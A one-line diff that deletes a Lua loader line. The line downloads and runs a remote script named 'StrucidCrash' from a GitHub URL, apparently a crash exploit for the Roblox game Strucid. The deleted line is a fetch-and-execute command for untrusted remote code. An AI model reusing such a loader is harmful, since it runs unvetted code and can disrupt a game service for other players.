@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dudeididntliterally/StrucidCrash/main/Strucid.lua", true))() --open source
